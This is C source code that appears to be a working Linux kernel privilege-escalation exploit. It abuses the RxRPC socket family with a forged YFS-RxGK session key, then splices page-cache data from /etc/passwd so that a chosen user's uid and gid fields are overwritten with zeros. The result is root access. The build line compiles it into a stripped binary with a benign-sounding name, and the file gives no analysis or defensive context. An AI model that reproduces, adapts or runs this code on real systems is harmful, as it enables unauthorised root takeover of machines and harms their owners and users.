/*  gcc -O2 -Wall -s stage5e_passwd_flip.c krb5kdf.c -lcrypto -o cache-sync  */

#define _GNU_SOURCE
#include "krb5kdf.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>

#define AF_RXRPC_                33
#define SOL_RXRPC                272
#define RXRPC_SECURITY_KEY       1
#define RXRPC_MIN_SECURITY_LEVEL 4
#define RXRPC_USER_CALL_ID       1
#define RXRPC_SECURITY_ENCRYPT   2
#define RXRPC_SECURITY_YFS_RXGK  6
#define ENCTYPE_AES128           17
#define PKT_DATA                 1
#define PKT_CHALLENGE            6
#define PKT_RESPONSE             7
#define FLAG_LAST                0x04

static int verbose;

#define V(...) do { if (verbose) fprintf(stderr, __VA_ARGS__); } while(0)

struct sockaddr_rxrpc {
    sa_family_t srx_family;
    uint16_t srx_service, transport_type, transport_len;
    union {
        sa_family_t family;
        struct sockaddr_in sin;
        struct sockaddr_in6 sin6;
    } transport;
};

struct wire_hdr {
    uint32_t epoch, cid, call, seq, serial;
    uint8_t type, flags, user_status, sec_index;
    uint16_t cksum, svc;
} __attribute__((packed));

struct xdr { uint8_t *buf; size_t cap, len; };
static void xdr_init(struct xdr *x, size_t c) { x->buf = calloc(1, c); x->cap = c; x->len = 0; }
static void xdr_u32(struct xdr *x, uint32_t v) { uint32_t b = htonl(v); memcpy(x->buf + x->len, &b, 4); x->len += 4; }
static void xdr_u64(struct xdr *x, uint64_t v) { xdr_u32(x, v >> 32); xdr_u32(x, v & 0xffffffff); }
static void xdr_op(struct xdr *x, const void *d, size_t n) {
    xdr_u32(x, n); size_t pl = (n + 3) & ~3u;
    memcpy(x->buf + x->len, d, n);
    if (pl > n) memset(x->buf + x->len + n, 0, pl - n);
    x->len += pl;
}
static void xdr_str(struct xdr *x, const char *s) { xdr_op(x, s, strlen(s)); }

static int aes_ecb(const uint8_t key[16], const uint8_t in[16],
                   uint8_t out[16], int enc)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, finl = 0, rc = -1;
    if (enc) {
        if (!EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL)) goto done;
        EVP_CIPHER_CTX_set_padding(ctx, 0);
        if (!EVP_EncryptUpdate(ctx, out, &outl, in, 16)) goto done;
        if (!EVP_EncryptFinal_ex(ctx, out + outl, &finl)) goto done;
    } else {
        if (!EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL)) goto done;
        EVP_CIPHER_CTX_set_padding(ctx, 0);
        if (!EVP_DecryptUpdate(ctx, out, &outl, in, 16)) goto done;
        if (!EVP_DecryptFinal_ex(ctx, out + outl, &finl)) goto done;
    }
    rc = 0;
done:
    EVP_CIPHER_CTX_free(ctx);
    return rc;
}

static void rand_fill(void *buf, size_t n)
{
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd >= 0) { read(fd, buf, n); close(fd); }
}

static ssize_t recv_poll(int fd, void *buf, size_t n,
                         struct sockaddr_in *from, int ms)
{
    struct pollfd pf = { .fd = fd, .events = POLLIN };
    if (poll(&pf, 1, ms) <= 0) return -1;
    socklen_t fl = sizeof(*from);
    return recvfrom(fd, buf, n, 0, (struct sockaddr *)from, &fl);
}

static struct sockaddr_in loopback(uint16_t port)
{
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = htonl(0x7F000001);
    return sa;
}

static int udp_listen(uint16_t port)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    int o = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
    struct sockaddr_in sa = loopback(port);
    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(fd); return -1; }
    return fd;
}

static long install_session_key(const char *desc, uint8_t k[16])
{
    rand_fill(k, 16);
    struct xdr t; xdr_init(&t, 4096);
    xdr_u64(&t, 0); xdr_u64(&t, 0x7fffffffffffffffULL);
    xdr_u64(&t, RXRPC_SECURITY_ENCRYPT);
    xdr_u64(&t, 0x7fffffffffffffffULL); xdr_u64(&t, 0);
    xdr_u64(&t, ENCTYPE_AES128);
    xdr_op(&t, k, 16);
    uint8_t pad[64]; memset(pad, 0xa5, 64); xdr_op(&t, pad, 64);
    struct xdr w; xdr_init(&w, 8192);
    xdr_u32(&w, 0); xdr_str(&w, "cf.lab"); xdr_u32(&w, 1);
    xdr_u32(&w, 4 + t.len); xdr_u32(&w, RXRPC_SECURITY_YFS_RXGK);
    memcpy(w.buf + w.len, t.buf, t.len); w.len += t.len;
    long s = syscall(SYS_add_key, "rxrpc", desc, w.buf, w.len, (long)-1);
    free(t.buf); free(w.buf);
    return s;
}

static long locate_field(const char *user, char window[12])
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return -1;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }
    char *buf = malloc(st.st_size + 1);
    ssize_t r = read(fd, buf, st.st_size);
    close(fd);
    if (r != st.st_size) { free(buf); return -1; }
    buf[r] = 0;
    size_t ulen = strlen(user);
    for (char *p = buf; p < buf + r; ) {
        if (strncmp(p, user, ulen) == 0 && p[ulen] == ':') {
            long off = (p - buf) + ulen + 1;
            if (off + 12 <= r) { memcpy(window, p + ulen + 1, 12); free(buf); return off; }
        }
        char *nl = memchr(p, '\n', buf + r - p);
        if (!nl) break;
        p = nl + 1;
    }
    free(buf); return -1;
}

static int verify_result(long off, const uint8_t expected[12])
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return -1;
    if (lseek(fd, off, SEEK_SET) != off) { close(fd); return -1; }
    uint8_t got[12];
    if (read(fd, got, 12) != 12) { close(fd); return -1; }
    close(fd);
    return memcmp(got, expected, 12) == 0 ? 0 : 1;
}

int main(int argc, char **argv)
{
    if (argc >= 2 && strcmp(argv[1], "-v") == 0) { verbose = 1; argv++; argc--; }

    const char *user = (argc >= 2) ? argv[1] : "np";
    const char *target = (argc >= 3) ? argv[2] : "x:0000:0000:";
    if (strlen(target) != 12) return 1;

    char fwin[12];
    long off = locate_field(user, fwin);
    if (off < 0 || memcmp(fwin, "x:", 2) != 0) return 1;
    V("[*] offset %ld\n", off);

    uint8_t T[12];
    memcpy(T, target, 12);

    int probe = socket(AF_RXRPC_, SOCK_DGRAM, AF_INET);
    if (probe < 0) return 1;
    close(probe);

    uint8_t K0[16];
    if (install_session_key("afs@cf.lab", K0) < 0) return 1;

    int srv = udp_listen(7000);
    if (srv < 0) return 1;

    int cli = socket(AF_RXRPC_, SOCK_DGRAM, AF_INET);
    if (cli < 0) return 1;
    const char *kn = "afs@cf.lab";
    setsockopt(cli, SOL_RXRPC, RXRPC_SECURITY_KEY, kn, strlen(kn));
    int lvl = RXRPC_SECURITY_ENCRYPT;
    setsockopt(cli, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, &lvl, sizeof(lvl));

    struct sockaddr_rxrpc loc = {0};
    loc.srx_family = AF_RXRPC_;
    loc.transport_type = SOCK_DGRAM;
    loc.transport_len = sizeof(struct sockaddr_in);
    loc.transport.sin = loopback(7001);
    if (bind(cli, (struct sockaddr *)&loc, sizeof(loc)) < 0) return 1;

    struct sockaddr_rxrpc dst = {0};
    dst.srx_family = AF_RXRPC_;
    dst.srx_service = 0xcafe;
    dst.transport_type = SOCK_DGRAM;
    dst.transport_len = sizeof(struct sockaddr_in);
    dst.transport.sin = loopback(7000);

    char data[] = "AAAAAAAA";
    char cb[CMSG_SPACE(sizeof(unsigned long))];
    struct iovec iov = { data, sizeof(data) - 1 };
    struct msghdr m = {0};
    m.msg_name = &dst; m.msg_namelen = sizeof(dst);
    m.msg_iov = &iov; m.msg_iovlen = 1;
    m.msg_control = cb; m.msg_controllen = sizeof(cb);
    struct cmsghdr *cm = CMSG_FIRSTHDR(&m);
    cm->cmsg_level = SOL_RXRPC;
    cm->cmsg_type = RXRPC_USER_CALL_ID;
    cm->cmsg_len = CMSG_LEN(sizeof(unsigned long));
    *(unsigned long *)CMSG_DATA(cm) = 1;
    fcntl(cli, F_SETFL, O_NONBLOCK);
    fcntl(srv, F_SETFL, O_NONBLOCK);
    sendmsg(cli, &m, 0);

    struct sockaddr_in from;
    uint8_t pkt[2048];
    if (recv_poll(srv, pkt, sizeof(pkt), &from, 5000) <= 0) return 1;
    struct wire_hdr *h = (void *)pkt;
    uint32_t epoch_be = h->epoch, cid_be = h->cid;
    uint16_t svc_be = h->svc;
    uint32_t epoch = ntohl(epoch_be), cid = ntohl(cid_be);
    V("[*] epoch=0x%x cid=0x%x\n", epoch, cid);

    uint8_t ch[48] = {0};
    struct wire_hdr *chh = (void *)ch;
    chh->epoch = epoch_be; chh->cid = cid_be;
    chh->serial = htonl(2);
    chh->type = PKT_CHALLENGE;
    chh->sec_index = RXRPC_SECURITY_YFS_RXGK;
    chh->svc = svc_be;
    rand_fill(ch + 28, 20);
    sendto(srv, ch, sizeof(ch), 0, (struct sockaddr *)&from, sizeof(from));

    if (recv_poll(srv, pkt, sizeof(pkt), &from, 5000) <= 0) return 1;
    h = (void *)pkt;
    if (h->type != PKT_RESPONSE) return 1;

    uint64_t start_time = ((uint64_t)ntohl(*(uint32_t *)(pkt + 28)) << 32) |
                           ntohl(*(uint32_t *)(pkt + 32));
    uint16_t key_number = ntohs(h->cksum);
    V("[*] st=0x%016llx kn=%u\n", (unsigned long long)start_time, key_number);

    uint8_t Ke[16];
    if (rxgk_derive_Ke(K0, epoch, cid, start_time, key_number,
                       RXGK_SERVER_ENC_PACKET, Ke) != 0) return 1;

    uint8_t X0[16], X1[16], X2[16], tmp[16];
    uint8_t zero[16] = {0};
    if (aes_ecb(Ke, zero, X0, 1) < 0) return 1;
    memcpy(X1, fwin, 12); memset(X1 + 12, 0, 4);
    if (aes_ecb(Ke, X1, tmp, 0) < 0) return 1;
    uint8_t x2in[16];
    memcpy(x2in, T, 12); memset(x2in + 12, 0, 4);
    for (int i = 0; i < 16; i++) x2in[i] ^= X1[i];
    if (aes_ecb(Ke, x2in, X2, 1) < 0) return 1;

    if (memcmp(X1, fwin, 12) != 0) return 1;

    close(srv);
    int conn = udp_listen(7000);
    if (conn < 0) return 1;
    if (connect(conn, (struct sockaddr *)&from, sizeof(from)) < 0) return 1;

    uint8_t hdr[60] = {0};
    struct wire_hdr *mh = (void *)hdr;
    mh->epoch = epoch_be; mh->cid = cid_be;
    mh->call = htonl(1); mh->seq = htonl(1); mh->serial = htonl(3);
    mh->type = PKT_DATA;
    mh->flags = FLAG_LAST;
    mh->sec_index = RXRPC_SECURITY_YFS_RXGK;
    mh->cksum = htons(key_number);
    mh->svc = svc_be;
    memcpy(hdr + 28, X0, 16);
    memcpy(hdr + 44, X2, 16);

    int pfd = open("/etc/passwd", O_RDONLY);
    if (pfd < 0) return 1;
    int p[2];
    if (pipe(p) < 0) return 1;

    struct iovec hiov = { .iov_base = hdr, .iov_len = 60 };
    if (vmsplice(p[1], &hiov, 1, 0) != 60) return 1;
    off_t spl_off = off;
    if (splice(pfd, &spl_off, p[1], NULL, 24, SPLICE_F_NONBLOCK) != 24) return 1;
    if (splice(p[0], NULL, conn, NULL, 84, SPLICE_F_MOVE) != 84) return 1;
    V("[*] sent\n");

    fcntl(cli, F_SETFL, O_NONBLOCK);
    for (int i = 0; i < 5; i++) {
        char rb[2048]; struct sockaddr_rxrpc rsx;
        char ccb[256]; struct iovec riv = { rb, sizeof(rb) };
        struct msghdr rm = {0};
        rm.msg_name = &rsx; rm.msg_namelen = sizeof(rsx);
        rm.msg_iov = &riv; rm.msg_iovlen = 1;
        rm.msg_control = ccb; rm.msg_controllen = sizeof(ccb);
        recvmsg(cli, &rm, 0);
        usleep(50000);
    }

    close(pfd); close(p[0]); close(p[1]); close(conn); close(cli);

    int rc = verify_result(off, T);
    V("[*] %s\n", rc == 0 ? "ok" : "fail");
    return rc;
}
